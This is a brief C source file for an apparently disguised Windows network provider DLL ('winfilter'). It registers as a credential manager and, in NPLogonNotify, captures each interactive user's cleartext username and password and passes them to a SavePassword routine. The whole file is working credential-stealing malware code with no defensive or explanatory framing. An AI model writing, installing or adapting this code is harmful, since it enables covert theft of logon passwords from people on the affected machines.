#include "winfilter.h"

__declspec(dllexport)
DWORD
APIENTRY
NPGetCaps(
	DWORD nIndex
)
{
	switch (nIndex)
	{
	case WNNC_SPEC_VERSION:
		return WNNC_SPEC_VERSION51;

	case WNNC_NET_TYPE:
		return WNNC_CRED_MANAGER;

	case WNNC_START:
		return WNNC_WAIT_FOR_START;

	default:
		return 0;
	}
}


__declspec(dllexport)
DWORD
APIENTRY
NPLogonNotify(
	PLUID lpLogonId,
	LPCWSTR lpAuthInfoType,
	LPVOID lpAuthInfo,
	LPCWSTR lpPrevAuthInfoType,
	LPVOID lpPrevAuthInfo,
	LPWSTR lpStationName,
	LPVOID StationHandle,
	LPWSTR* lpLogonScript
)
{
	SavePassword(
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
	);
	lpLogonScript = NULL;
	return WN_SUCCESS;
}
